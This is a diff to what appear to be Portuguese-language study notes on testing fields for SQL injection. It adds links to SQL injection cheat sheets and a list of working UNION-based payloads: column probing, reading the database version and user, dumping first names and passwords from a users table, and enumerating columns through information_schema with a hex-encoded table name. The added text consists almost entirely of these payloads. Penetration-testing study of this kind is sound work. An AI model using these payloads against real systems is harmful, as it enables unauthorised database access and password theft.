@@ -9,3 +9,18 @@ COMANDOS INICIAIS PARA TESTAR SQL INJECTION EM UM CAMPO
 SITE COM AS QUERYS PARA TODOS OS MODELOS DE BANCOS DE DADOS, BIZÚ!!!
 
 http://www.sqlinjectionwiki.com/
+
+http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
+
+
+EXEMPLOS E QUERYS
+
+1' and 1=0 union select 1,2() # colocar números para identificar quais campos são exibidos no retorno e o total de campos da tabela.
+
+1' and 1=0 union select version(),user()#
+
+1' and 1=0 union select null, concat(first_name, 0x0a, password) from users#
+
+
+1 and 1=0 union select table_name, column_name from information_schema.columns where table_name=0x7573657273# --table_name = users
+
